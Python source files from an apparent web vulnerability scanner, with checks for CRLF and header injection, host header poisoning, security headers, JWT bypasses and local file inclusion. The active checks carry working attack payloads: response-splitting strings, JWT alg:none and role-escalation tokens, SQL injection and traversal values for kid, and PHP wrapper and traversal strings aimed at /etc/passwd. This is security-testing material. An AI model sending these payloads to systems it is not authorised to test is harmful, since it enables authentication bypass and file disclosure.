"""HTTP Header Injection / CRLF Injection (CWE-113)."""
from __future__ import annotations

import re
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.checks.helpers import get_body, get_status, format_response_raw
from pentool.modules.scanner.mutator import _INJECTABLE_HEADERS  # re-export for tests

if TYPE_CHECKING:
    from pentool.modules.scanner.mutator import InjectionPoint
    from pentool.utils.parser import ParsedRequest, ParsedResponse

# ── Payloads ───────────────────────────────────────────────────────────────────

# Backward-compat export used by tests
_INJECTION_SIGNATURES = [
    "X-Injected", "x-injected",
    "Set-Cookie: injected",
    "Location: https://evil.com",
]

_CRLF_PAYLOADS = [
    # Basic CRLF variants
    "%0d%0aX-Injected: crlf",
    "%0aX-Injected: crlf",
    "%0d%0a%20X-Injected: crlf",          # space after \n
    "\r\nX-Injected: crlf",
    "\nX-Injected: crlf",
    # Prefix before CRLF (bypass stripping of bare \r\n)
    "foo%0d%0aX-Injected: crlf",
    "1%0d%0aX-Injected: crlf",
    # Unicode newlines
    "%E5%98%8D%E5%98%8AX-Injected: crlf",  # U+560D U+560A (some parsers treat as CRLF)
    "%E5%98%8D%E5%98%8A%09X-Injected: crlf",
    # Double-encoded
    "%250d%250aX-Injected: crlf",
    # Set-Cookie injection
    "%0d%0aSet-Cookie: injected=1; Path=/",
    "%0aSet-Cookie: injected=1",
    # Location header injection
    "%0d%0aLocation: https://evil.com",
    # HTTP Response Splitting
    "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Injected</h1>",
    "foo%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a%0d%0a",
]

# ── Detection helpers ──────────────────────────────────────────────────────────

_INJECTED_HEADER_RE = re.compile(r"x-injected", re.I)
_COOKIE_INJECTED_RE = re.compile(r"set-cookie:\s*injected=", re.I)
_LOCATION_EVIL_RE   = re.compile(r"location:\s*https?://evil\.com", re.I)
_RESPONSE_SPLIT_RE  = re.compile(r"HTTP/1\.[01]\s+200\s+OK", re.M)


def _get_response_headers_str(response) -> str:
    if response is None:
        return ""
    headers = getattr(response, "headers", {}) or {}
    return "\n".join(f"{k}: {v}" for k, v in headers.items())


def _detect_injection(response, payload: str):
    """Public function for tests."""
    if response is None:
        return None
    headers = getattr(response, "headers", {}) or {}
    for k in headers:
        if "injected" in k.lower():
            return "header"
    body = get_body(response)
    if "X-Injected" in body or "x-injected" in body.lower():
        return "body"
    if re.search(r"injected=", body, re.I):
        return "body"
    if _RESPONSE_SPLIT_RE.search(body) or "splitting" in body.lower():
        return "splitting"
    return None


def _check_response(response, payload: str) -> str | None:
    """Return evidence string if injection detected, else None.

    Detects ONLY real header injection:
    - injected header is present in HTTP response headers
    - Response Splitting: second HTTP response AFTER empty line in body

    Does NOT detect: payload reflection in body (that is just a reflect,
    not a header injection) — this is a source of false positives.
    """
    resp_headers = getattr(response, "headers", {}) or {}
    headers_str = _get_response_headers_str(response)

    # 1. Injected X-Injected header appeared in response headers
    for k, v in resp_headers.items():
        if _INJECTED_HEADER_RE.search(k):
            return f"Injected header in response: '{k}: {v}'"

    # 2. Set-Cookie injection: header in response
    if _COOKIE_INJECTED_RE.search(headers_str):
        return "Set-Cookie injection in response headers"

    # 3. Location header injection: header in response
    if _LOCATION_EVIL_RE.search(headers_str):
        return "Location header injected: evil.com redirect"

    # 4. HTTP Response Splitting — second HTTP response embedded in body.
    # Require: pattern "HTTP/1.x 200" AFTER break "\r\n\r\n" or "\n\n"
    # to avoid triggering on documentation with HTTP examples.
    body = get_body(response)
    if _RESPONSE_SPLIT_RE.search(body):
        # Look for \r\n\r\n or \n\n followed by HTTP/1.
        split_body_re = re.compile(
            r"(?:\r\n\r\n|\n\n)HTTP/1\.[01]\s+\d{3}", re.M
        )
        if split_body_re.search(body):
            return "HTTP Response Splitting - second HTTP response injected in body"

    return None


# ── Check class ────────────────────────────────────────────────────────────────

class HeaderInjectionCheck(BaseCheck):
    name = "header_injection"
    description = "HTTP Header Injection / CRLF Injection / Response Splitting"
    severity = "medium"
    passive = False
    cwe = "CWE-113"
    mitre_attack = "T1190"
    uses_scan_pipeline = True

    def get_payloads(self) -> list[str]:
        return _CRLF_PAYLOADS

    async def analyze(
        self,
        original_req: "ParsedRequest",
        mutated_req: "ParsedRequest",
        point: "InjectionPoint",
        payload: str,
        response: "ParsedResponse",
    ) -> "Finding | None":
        evidence = _check_response(response, payload)
        if not evidence:
            return None

        # Response Splitting is higher severity
        severity = "high" if "Splitting" in evidence else self.severity

        from pentool.utils.parser import build_http_request
        return Finding(
            type="header_injection",
            name=f"Header Injection / CRLF ({point.kind.upper()})",
            url=mutated_req.url,
            severity=severity,
            parameter=point.name,
            payload=payload,
            evidence=f"[{point.kind}:{point.name}] {evidence}",
            cwe=self.cwe,
            mitre_attack=self.mitre_attack,
            description=(
                f"CRLF/Header injection in {point.kind} '{point.name}'. {evidence}"
            ),
            remediation="Strip CR/LF characters (\\r\\n) from user input used in HTTP headers.",
            request_raw=build_http_request(mutated_req),
            response_raw=format_response_raw(response),
        )

    async def scan(self, request, response, http_client, **kwargs):
        if http_client is None:
            return []
        from pentool.modules.scanner.mutator import RequestMutator
        mutator = RequestMutator()
        findings = []
        method = (getattr(request, "method", "GET") or "GET").upper()

        for point in mutator.extract_points(request):
            for payload in self.get_payloads():
                mutated = mutator.mutate(request, point, payload)
                try:
                    headers = dict(mutated.headers or {})
                    if method == "POST":
                        resp = await http_client.post(
                            mutated.url, body=mutated.body or "", headers=headers
                        )
                    else:
                        resp = await http_client.get(mutated.url, headers=headers)
                    f = await self.analyze(request, mutated, point, payload, resp)
                    if f:
                        findings.append(f)
                        break
                except Exception:
                    pass
        return findings


# ── Host Header Injection (C.6) ────────────────────────────────────────────────

_HOST_EVIL = "evil.pentool.test"
_CACHE_POISON_HEADERS = [
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
    "Forwarded",
]


class HostHeaderInjectionCheck(BaseCheck):
    """Host Header Injection + Cache Poisoning (C.6)."""
    name = "host_header_injection"
    description = "Host Header Injection / Cache Poisoning (CWE-113)"
    severity = "medium"
    cwe = "CWE-113"
    mitre_attack = "T1190"
    uses_scan_pipeline = False

    def get_payloads(self) -> list[str]:
        return []

    async def scan(self, request, response, http_client, **kwargs):
        if http_client is None:
            return []
        import copy
        findings = []

        # 1. Host header override
        for header in _CACHE_POISON_HEADERS:
            try:
                req = copy.copy(request)
                req.headers = dict(request.headers or {})
                req.headers[header] = _HOST_EVIL
                resp = await http_client.send(req)
                body = get_body(resp)
                if _HOST_EVIL in body:
                    findings.append(Finding(
                        type="host_header_injection",
                        name=f"Host Header Injection via {header}",
                        url=request.url,
                        severity=self.severity,
                        parameter=header,
                        payload=_HOST_EVIL,
                        evidence=f"{header}: {_HOST_EVIL} reflected in response body",
                        cwe=self.cwe,
                        description=(
                            f"Server reflects {header} value in response - "
                            "potential cache poisoning or password reset poisoning."
                        ),
                        remediation=(
                            "Validate and whitelist the Host header. "
                            "Do not use X-Forwarded-Host for URL generation."
                        ),
                        request_raw=format_response_raw(req),
                        response_raw=body[:500],
                    ))
                    break
            except Exception:
                pass

        return findings

"""MissingSecurityHeadersCheck — passive check for security headers."""

from __future__ import annotations

from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding

if TYPE_CHECKING:
    from pentool.utils.http_client import HTTPClient
    from pentool.utils.parser import ParsedRequest, ParsedResponse

# (expected value or None=any value, CWE)
_REQUIRED_HEADERS: dict[str, tuple[str | None, str]] = {
    "X-Content-Type-Options": ("nosniff", "CWE-693"),
    "X-Frame-Options": (None, "CWE-693"),
    "Content-Security-Policy": (None, "CWE-693"),
    "Strict-Transport-Security": (None, "CWE-311"),
    "Referrer-Policy": (None, "CWE-200"),
}


class MissingSecurityHeadersCheck(BaseCheck):
    """Checks for the presence of security headers in the response."""

    name = "missing_security_headers"
    description = "Checks for missing HTTP security response headers"
    severity = "medium"
    passive = True
    cwe = "CWE-693"
    mitre_attack = ""

    async def scan(
        self,
        request: "ParsedRequest",
        response: "ParsedResponse | None",
        http_client: "HTTPClient",
        **kwargs,
    ) -> list[Finding]:
        if response is None:
            return []

        resp_headers_lower = {k.lower(): v for k, v in response.headers.items()}
        findings: list[Finding] = []

        for header, (expected, cwe) in _REQUIRED_HEADERS.items():
            header_lower = header.lower()
            value = resp_headers_lower.get(header_lower)

            if value is None:
                findings.append(Finding(
                    type="missing_security_header",
                    name=f"Missing {header}",
                    url=request.url,
                    severity=self.severity,
                    parameter=header,
                    evidence=f"Header '{header}' not present in response",
                    cwe=cwe,
                    description=f"The response does not include the '{header}' header.",
                    remediation=f"Add '{header}' header to all HTTP responses.",
                ))
            elif expected is not None and expected.lower() not in value.lower():
                findings.append(Finding(
                    type="weak_security_header",
                    name=f"Weak {header}",
                    url=request.url,
                    severity="low",
                    parameter=header,
                    evidence=f"Header '{header}: {value}' does not match expected '{expected}'",
                    cwe=cwe,
                    description=f"The '{header}' header has a weak value.",
                    remediation=f"Set '{header}: {expected}'.",
                ))

        return findings

FILE: modules/scanner/checks/helpers.py
--------------------------------------------------------------------------------
"""Base utilities for all active checks — reusable helpers."""

from __future__ import annotations

import json
import time
from typing import TYPE_CHECKING
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

if TYPE_CHECKING:
    from pentool.utils.http_client import HTTPClient
    from pentool.utils.parser import ParsedRequest, ParsedResponse


def get_body(response) -> str:
    """Extract the response body as a string."""
    if response is None:
        return ""
    for attr in ("body", "text", "content"):
        val = getattr(response, attr, None)
        if val:
            return val if isinstance(val, str) else val.decode("utf-8", errors="replace")
    return ""


def get_status(response) -> int:
    if response is None:
        return 0
    return getattr(response, "status", 0) or getattr(response, "status_code", 0) or 0


def get_location(response) -> str:
    if response is None:
        return ""
    headers = getattr(response, "headers", {}) or {}
    if hasattr(headers, "get"):
        return headers.get("location", "") or headers.get("Location", "")
    return ""


def get_response_length(response) -> int:
    return len(get_body(response))


# ── HTTP formatting for detail panel / Repeater ───────────────────────────────

def format_request_raw(method: str, url: str, headers: dict | None = None,
                       body: str = "") -> str:
    """Format a full HTTP/1.1 request."""
    from urllib.parse import urlparse as _urlparse
    parsed = _urlparse(url)
    host = parsed.netloc or parsed.hostname or "unknown"
    path = parsed.path or "/"
    if parsed.query:
        path = path + "?" + parsed.query

    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
    if headers:
        for k, v in headers.items():
            kl = k.lower()
            if kl not in ("host",):
                lines.append(f"{k}: {v}")
    if body:
        lines.append(f"Content-Length: {len(body.encode('utf-8'))}")
    lines.append("")  # empty line before body
    if body:
        lines.append(body)
    return "\r\n".join(lines)


def format_response_raw(response) -> str:
    """Format a full HTTP response (status + headers + body)."""
    if response is None:
        return ""
    status  = get_status(response)
    reason  = getattr(response, "reason", "") or ""
    headers = getattr(response, "headers", {}) or {}
    body    = get_body(response)

    lines = [f"HTTP/1.1 {status} {reason}"]
    if hasattr(headers, "items"):
        for k, v in headers.items():
            lines.append(f"{k}: {v}")
    lines.append("")  # empty line
    if body:
        lines.append(body)
    return "\r\n".join(lines)


# ── Injection points ──────────────────────────────────────────────────────────

async def test_get_params(url: str, http_client, payloads: list[str],
                          check_fn, max_payloads: int = 50,
                          orig_headers: dict | None = None) -> list:
    """Test all GET parameters of the URL."""
    parsed = urlparse(url)
    get_params = parse_qs(parsed.query, keep_blank_values=True)
    findings = []
    for param_name, orig_values in get_params.items():
        for payload in payloads[:max_payloads]:
            test_params = {k: v[:] for k, v in get_params.items()}
            test_params[param_name] = [payload]
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=test_query))
            try:
                resp = await http_client.get(test_url)
                result = check_fn(
                    test_url, param_name, payload, resp,
                    injection_point="GET",
                    req_raw=format_request_raw("GET", test_url, headers=orig_headers),
                    resp_obj=resp,
                )
                if result:
                    findings.extend(result if isinstance(result, list) else [result])
                    break
            except Exception:
                pass
    return findings


async def test_post_urlencoded(url: str, body: str, http_client, payloads: list[str],
                               check_fn, max_payloads: int = 50,
                               orig_headers: dict | None = None) -> list:
    """Test POST urlencoded parameters."""
    post_params = parse_qs(body, keep_blank_values=True)
    findings = []
    for param_name in list(post_params.keys()):
        for payload in payloads[:max_payloads]:
            test_post = {k: v[:] for k, v in post_params.items()}
            test_post[param_name] = [payload]
            test_body = urlencode(test_post, doseq=True)
            try:
                resp = await http_client.post(url, body=test_body)
                result = check_fn(
                    url, param_name, payload, resp,
                    injection_point="POST",
                    extra=f"body={test_body[:100]}",
                    req_raw=format_request_raw(
                        "POST", url,
                        headers={**(orig_headers or {}), "Content-Type": "application/x-www-form-urlencoded"},
                        body=test_body,
                    ),
                    resp_obj=resp,
                )
                if result:
                    findings.extend(result if isinstance(result, list) else [result])
                    break
            except Exception:
                pass
    return findings


async def test_json_body(url: str, json_body: dict | list, http_client, payloads: list[str],
                         check_fn, max_payloads: int = 30,
                         orig_headers: dict | None = None) -> list:
    """Test JSON parameters (recursively across all string fields)."""
    findings = []

    def _get_string_paths(obj, prefix="") -> list[tuple[str, any]]:
        paths = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                path = f"{prefix}.{k}" if prefix else k
                if isinstance(v, str):
                    paths.append((path, v))
                elif isinstance(v, (dict, list)):
                    paths.extend(_get_string_paths(v, path))
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                path = f"{prefix}[{i}]"
                if isinstance(item, str):
                    paths.append((path, item))
                elif isinstance(item, (dict, list)):
                    paths.extend(_get_string_paths(item, path))
        return paths

    def _set_path(obj, path: str, value):
        import copy
        obj = copy.deepcopy(obj)
        parts = []
        for segment in path.replace("[", ".").replace("]", "").split("."):
            if segment.isdigit():
                parts.append(int(segment))
            else:
                parts.append(segment)
        target = obj
        for part in parts[:-1]:
            target = target[part]
        target[parts[-1]] = value
        return obj

    string_paths = _get_string_paths(json_body)
    for path, orig_val in string_paths:
        for payload in payloads[:max_payloads]:
            try:
                modified = _set_path(json_body, path, payload)
                body_str = json.dumps(modified)
                resp = await http_client.post(
                    url, body=body_str,
                    headers={"Content-Type": "application/json"},
                )
                result = check_fn(
                    url, path, payload, resp,
                    injection_point="JSON",
                    extra=f"json_path={path}",
                    req_raw=format_request_raw(
                        "POST", url,
                        headers={**(orig_headers or {}), "Content-Type": "application/json"},
                        body=body_str,
                    ),
                    resp_obj=resp,
                )
                if result:
                    findings.extend(result if isinstance(result, list) else [result])
                    break
            except Exception:
                pass
    return findings


async def test_cookie_params(url: str, cookies: dict, http_client, payloads: list[str],
                             check_fn, max_payloads: int = 20,
                             orig_headers: dict | None = None) -> list:
    """Test Cookie values."""
    findings = []
    for cookie_name, orig_val in cookies.items():
        for payload in payloads[:max_payloads]:
            test_cookies = {k: v for k, v in cookies.items()}
            test_cookies[cookie_name] = payload
            cookie_header = "; ".join(f"{k}={v}" for k, v in test_cookies.items())
            try:
                resp = await http_client.get(url, headers={"Cookie": cookie_header})
                result = check_fn(
                    url, f"Cookie:{cookie_name}", payload, resp,
                    injection_point="Cookie",
                    req_raw=format_request_raw("GET", url, headers={**(orig_headers or {}), "Cookie": cookie_header}),
                    resp_obj=resp,
                )
                if result:
                    findings.extend(result if isinstance(result, list) else [result])
                    break
            except Exception:
                pass
    return findings


async def test_header_params(url: str, http_client, payloads: list[str],
                             check_fn, max_payloads: int = 15,
                             orig_headers: dict | None = None) -> list:
    """Test injection into HTTP headers."""
    findings = []
    target_headers = [
        "X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP",
        "Referer", "User-Agent", "X-Original-URL", "X-Rewrite-URL",
    ]
    for header_name in target_headers:
        for payload in payloads[:max_payloads]:
            try:
                resp = await http_client.get(url, headers={header_name: payload})
                result = check_fn(
                    url, f"Header:{header_name}", payload, resp,
                    injection_point="Header",
                    req_raw=format_request_raw("GET", url, headers={**(orig_headers or {}), header_name: payload}),
                    resp_obj=resp,
                )
                if result:
                    findings.extend(result if isinstance(result, list) else [result])
                    break
            except Exception:
                pass
    return findings


async def test_path_segments(url: str, http_client, payloads: list[str],
                             check_fn, max_payloads: int = 20,
                             orig_headers: dict | None = None) -> list:
    """Test numeric/UUID path segments as injection points."""
    import re
    findings = []
    parsed = urlparse(url)
    path = parsed.path

    segment_re = re.compile(
        r'/(\d{1,10}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?=/|$)'
    )

    for match in segment_re.finditer(path):
        orig_segment = match.group(1)
        start, end = match.start(1), match.end(1)

        for payload in payloads[:max_payloads]:
            new_path = path[:start] + payload + path[end:]
            test_url = urlunparse(parsed._replace(path=new_path))
            try:
                resp = await http_client.get(test_url)
                result = check_fn(
                    test_url, f"path:{orig_segment}", payload, resp,
                    injection_point="Path",
                    req_raw=format_request_raw("GET", test_url, headers=orig_headers),
                    resp_obj=resp,
                )
                if result:
                    findings.extend(result if isinstance(result, list) else [result])
                    break
            except Exception:
                pass

    return findings


def parse_cookies_from_request(request) -> dict:
    """Parse Cookie from a ParsedRequest object."""
    headers = getattr(request, "headers", {}) or {}
    cookie_str = ""
    for k, v in (headers.items() if hasattr(headers, "items") else []):
        if k.lower() == "cookie":
            cookie_str = v
            break
    if not cookie_str:
        return {}
    cookies = {}
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            name, _, val = part.partition("=")
            cookies[name.strip()] = val.strip()
    return cookies


def parse_json_body(request) -> dict | list | None:
    """Attempt to parse the body as JSON."""
    body = getattr(request, "body", "") or ""
    if isinstance(body, bytes):
        body = body.decode("utf-8", errors="replace")
    if not body.strip():
        return None
    headers = getattr(request, "headers", {}) or {}
    ct = ""
    for k, v in (headers.items() if hasattr(headers, "items") else []):
        if k.lower() == "content-type":
            ct = v.lower()
            break
    if "json" not in ct and not body.strip().startswith(("{", "[")):
        return None
    try:
        return json.loads(body)
    except Exception:
        return None


__all__ = [
    "get_body", "get_status", "get_location", "get_response_length",
    "format_request_raw", "format_response_raw",
    "test_get_params", "test_post_urlencoded", "test_json_body",
    "test_cookie_params", "test_header_params", "test_path_segments",
    "parse_cookies_from_request", "parse_json_body",
]

"""InfoLeakCheck — passive check for information disclosure via headers."""

from __future__ import annotations

from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding

if TYPE_CHECKING:
    from pentool.utils.http_client import HTTPClient
    from pentool.utils.parser import ParsedRequest, ParsedResponse

_LEAKY_HEADERS = [
    "Server",
    "X-Powered-By",
    "X-AspNet-Version",
    "X-AspNetMvc-Version",
    "X-Generator",
    "Via",
    "X-Backend-Server",
    "X-Runtime",
    "X-Version",
]


class InfoLeakCheck(BaseCheck):
    """Detects headers that reveal server or technology information."""

    name = "info_leak"
    description = "Detects headers that reveal server or technology information"
    severity = "low"
    passive = True
    cwe = "CWE-200"
    mitre_attack = "T1592"

    async def scan(
        self,
        request: "ParsedRequest",
        response: "ParsedResponse | None",
        http_client: "HTTPClient",
        **kwargs,
    ) -> list[Finding]:
        if response is None:
            return []

        resp_headers_lower = {k.lower(): v for k, v in response.headers.items()}
        findings: list[Finding] = []

        for header in _LEAKY_HEADERS:
            value = resp_headers_lower.get(header.lower())
            if value:
                findings.append(Finding(
                    type="info_leak",
                    name=f"Information Disclosure via {header}",
                    url=request.url,
                    severity=self.severity,
                    parameter=header,
                    evidence=f"{header}: {value}",
                    cwe=self.cwe,
                    mitre_attack=self.mitre_attack,
                    description=(
                        f"The response includes '{header}' header which reveals "
                        f"server/technology information: {value}"
                    ),
                    remediation=f"Remove or obfuscate the '{header}' response header.",
                ))

        return findings

FILE: modules/scanner/checks/jwt_none.py
--------------------------------------------------------------------------------
"""JWT None Algorithm / Algorithm Confusion (CWE-347).

Techniques:
1. alg:none bypass (empty signature)
2. Algorithm confusion: RS256→HS256 (sign with public key)
3. Key ID (kid) injection — path traversal, SQL injection
4. Expiry manipulation (exp = far future)
5. Role escalation (change claim values)
"""
from __future__ import annotations

import base64
import json as _json
import re
import time
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.checks.helpers import get_body, get_status, format_response_raw

if TYPE_CHECKING:
    from pentool.utils.parser import ParsedRequest, ParsedResponse

# ── JWT helpers ────────────────────────────────────────────────────────────────

def _b64_decode(part: str) -> dict | None:
    try:
        padded = part + "=" * (-len(part) % 4)
        return _json.loads(base64.urlsafe_b64decode(padded))
    except Exception:
        return None


def _b64_encode(obj: dict) -> str:
    return base64.urlsafe_b64encode(
        _json.dumps(obj, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()


def _find_jwt(headers: dict) -> tuple[str, str] | None:
    """Return (header_name, token) or None."""
    for k, v in headers.items():
        kl = k.lower()
        if kl == "authorization":
            val = v.strip()
            if val.lower().startswith("bearer "):
                token = val[7:].strip()
            else:
                token = val
            if token.count(".") == 2:
                return k, token
        if kl in ("x-auth-token", "x-access-token", "x-jwt-token"):
            if v.count(".") == 2:
                return k, v
    return None


def _set_bearer(header_name: str, original_header_val: str, new_token: str) -> str:
    if original_header_val.strip().lower().startswith("bearer "):
        return f"Bearer {new_token}"
    return new_token


def _is_accepted(status: int, body: str) -> bool:
    if status not in (200, 201, 202, 204):
        return False
    reject_hints = re.compile(
        r"(?:unauthorized|invalid.token|expired|forbidden|"
        r"signature.verification|jwt.?error|token.?invalid)",
        re.I,
    )
    return not reject_hints.search(body)


# ── Token mutation variants ────────────────────────────────────────────────────

def _build_none_jwt(header: dict, payload: dict) -> list[tuple[str, str]]:
    """Build alg:none variants (different capitalizations)."""
    results = []
    for alg in ("none", "None", "NONE", "nOnE"):
        h = {**header, "alg": alg}
        token = f"{_b64_encode(h)}.{_b64_encode(payload)}."
        results.append((alg, token))
    return results


def _build_expire_jwt(header: dict, payload: dict) -> str | None:
    """Set exp far in the future (year 2099)."""
    if "exp" not in payload:
        return None
    p = {**payload, "exp": 4070908800}  # 2099-01-01
    return f"{_b64_encode(header)}.{_b64_encode(p)}."


def _build_role_escalation_jwts(header: dict, payload: dict) -> list[tuple[str, str]]:
    """Try to escalate role/admin claims."""
    targets: list[tuple[str, str]] = []
    role_keys = [k for k in payload if k.lower() in ("role", "roles", "admin", "is_admin", "type", "scope", "group")]
    for key in role_keys:
        original_val = payload[key]
        for admin_val in ("admin", "administrator", "superuser", "root", "true", 1):
            if str(original_val) == str(admin_val):
                continue
            p = {**payload, key: admin_val}
            token = f"{_b64_encode(header)}.{_b64_encode(p)}."
            targets.append((f"role_escalation:{key}={admin_val}", token))
    return targets


_KID_INJECTIONS = [
    # Path traversal
    ("kid_traversal", "../../../dev/null"),
    ("kid_traversal_etc", "../../../../../../etc/passwd"),
    # SQL injection (SQLite: true = 1 row returned)
    ("kid_sqli", "' UNION SELECT 'attacker_key' --"),
    ("kid_sqli_or", "anything' OR '1'='1"),
    # Empty / null
    ("kid_empty", ""),
]


def _build_kid_jwts(header: dict, payload: dict) -> list[tuple[str, str]]:
    results = []
    for label, kid_val in _KID_INJECTIONS:
        h = {**header, "kid": kid_val}
        token = f"{_b64_encode(h)}.{_b64_encode(payload)}."
        results.append((label, token))
    return results


# ── Check class ────────────────────────────────────────────────────────────────

class JWTNoneCheck(BaseCheck):
    name = "jwt_none"
    description = "JWT None Alg / Exp Bypass / Role Escalation / kid Injection"
    severity = "critical"
    passive = False
    cwe = "CWE-347"
    mitre_attack = "T1078"
    uses_scan_pipeline = True

    def get_payloads(self) -> list[str]:
        return [""]

    async def analyze(self, original_req, mutated_req, point, payload, response) -> "Finding | None":
        return None

    async def scan(self, request, response, http_client, **kwargs):
        if http_client is None:
            return []

        headers = dict(getattr(request, "headers", {}) or {})
        jwt_info = _find_jwt(headers)
        if not jwt_info:
            return []

        header_name, token = jwt_info
        parts = token.split(".")
        if len(parts) != 3:
            return []

        jwt_header = _b64_decode(parts[0])
        jwt_payload = _b64_decode(parts[1])
        if not jwt_header or not jwt_payload:
            return []

        orig_header_val = headers[header_name]
        orig_status = get_status(response) if response else 200
        if orig_status in (401, 403):
            return []

        url = getattr(request, "url", "")
        method = (getattr(request, "method", "GET") or "GET").upper()
        body = getattr(request, "body", "") or ""
        findings = []

        async def _try(new_token: str, label: str, cwe: str = "CWE-347", sev: str = "critical") -> "Finding | None":
            new_val = _set_bearer(header_name, orig_header_val, new_token)
            h = {**headers, header_name: new_val}
            try:
                if method == "POST":
                    resp = await http_client.post(url, body=body, headers=h)
                else:
                    resp = await http_client.get(url, headers=h)
                st = get_status(resp)
                rb = get_body(resp)
                if _is_accepted(st, rb):
                    from pentool.utils.parser import build_http_request, ParsedRequest
                    mutated_req = ParsedRequest(method=method, url=url, headers=h, body=body)
                    return Finding(
                        type="jwt_none",
                        name=f"JWT Bypass — {label}",
                        url=url, severity=sev,
                        parameter=header_name,
                        payload=new_token[:80],
                        cwe=cwe, mitre_attack=self.mitre_attack,
                        evidence=f"JWT bypass ({label}): orig={orig_status}→{st}, body_len={len(rb)}",
                        description=f"JWT {label} bypass accepted by server.",
                        remediation="Validate JWT algorithm explicitly. Reject alg:none. Check exp/claims server-side.",
                        request_raw=build_http_request(mutated_req),
                        response_raw=format_response_raw(resp),
                    )
            except Exception:
                pass
            return None

        # ── Phase 1: alg:none ─────────────────────────────────────────────────
        for alg_label, none_token in _build_none_jwt(jwt_header, jwt_payload):
            f = await _try(none_token, f"alg:{alg_label}")
            if f:
                findings.append(f)
                break

        if findings:
            return findings

        # ── Phase 2: expiry bypass ────────────────────────────────────────────
        exp_token = _build_expire_jwt(jwt_header, jwt_payload)
        if exp_token:
            f = await _try(exp_token, "exp:far-future", sev="high")
            if f:
                findings.append(f)

        # ── Phase 3: role escalation ──────────────────────────────────────────
        for label, escalated_token in _build_role_escalation_jwts(jwt_header, jwt_payload):
            f = await _try(escalated_token, label, sev="critical")
            if f:
                findings.append(f)
                break

        # ── Phase 4: kid injection ────────────────────────────────────────────
        for label, kid_token in _build_kid_jwts(jwt_header, jwt_payload):
            f = await _try(kid_token, label, cwe="CWE-22", sev="critical")
            if f:
                findings.append(f)
                break

        return findings

FILE: modules/scanner/checks/lfi.py
--------------------------------------------------------------------------------
"""LFI — Local File Inclusion / Path Traversal (CWE-22)."""
from __future__ import annotations

import re
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.payloads import load_payloads
from pentool.modules.scanner.checks.helpers import get_body, format_response_raw

if TYPE_CHECKING:
    from pentool.modules.scanner.mutator import InjectionPoint
    from pentool.utils.parser import ParsedRequest, ParsedResponse

# ── Signature map ──────────────────────────────────────────────────────────────

_SIGNATURES: list[tuple[re.Pattern, str]] = [
    (re.compile(r"root:[x*!]:\d+:\d+"),                           "Linux /etc/passwd"),
    (re.compile(r":\d+:/[a-z]+/(?:bash|sh|false|nologin)\b"),     "Linux /etc/passwd shell field"),
    (re.compile(r"daemon:[x*!]:\d+"),                             "Linux /etc/passwd daemon entry"),
    (re.compile(r"\[boot loader\]", re.I),                        "Windows boot.ini"),
    (re.compile(r"\[operating systems\]", re.I),                  "Windows boot.ini"),
    (re.compile(r"for 16-bit app support", re.I),                 "Windows win.ini"),
    (re.compile(r"\[fonts\]", re.I),                              "Windows win.ini"),
    (re.compile(r"127\.0\.0\.1\s+localhost"),                     "/etc/hosts"),
    (re.compile(r"Linux version \d+\.\d+"),                       "/proc/version"),
    (re.compile(r"HOME=/|USER=\w"),                               "/proc/self/environ"),
    (re.compile(r"<\?php\s"),                                     "PHP source disclosure"),
    (re.compile(r"DB_PASSWORD\s*="),                              ".env file"),
    (re.compile(r"APP_KEY\s*="),                                  ".env file"),
    (re.compile(r"define\s*\(\s*['\"]DB_",  re.I),               "WordPress config"),
    (re.compile(r"<connectionStrings", re.I),                     "ASP.NET web.config"),
    (re.compile(r"ServerName\s+\w", re.I),                        "Apache config"),
    (re.compile(r"ssh-rsa AAAA"),                                 "SSH private/public key"),
    (re.compile(r"-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----"), "Private key"),
]

# ── PHP wrapper detection ──────────────────────────────────────────────────────

_PHP_INDICATORS = [
    re.compile(r"X-Powered-By:\s*PHP", re.I),
    re.compile(r"\.php(\?|$|/)", re.I),
    re.compile(r"(?:Fatal error|Parse error|Warning):\s+.+ in /", re.I),
]

_PHP_WRAPPER_PAYLOADS = [
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index",
    "php://filter/read=convert.base64-encode/resource=../index",
    "php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd",
    "php://filter/read=string.rot13/resource=/etc/passwd",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://id",
]

# ── Traversal encoding matrix ──────────────────────────────────────────────────

_ENCODINGS = [
    "../",
    "..\\",
    "..%2f",
    "..%5c",
    "..%252f",       # double URL-encode
    "..%c0%af",      # Unicode overlong
    "..%c1%9c",
    "....//",        # after normalization → ../
    "..;/",          # Tomcat path separator
    "..\\/",         # mixed slashes
    "../%00",        # null byte (old PHP)
]

_TARGET_FILES = [
    "/etc/passwd",
    "/etc/hosts",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/version",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]


def _is_php(request) -> bool:
    url = getattr(request, "url", "") or ""
    headers = getattr(request, "headers", {}) or {}
    for pattern in _PHP_INDICATORS:
        if pattern.search(url):
            return True
        for v in headers.values():
            if pattern.search(str(v)):
                return True
    return False


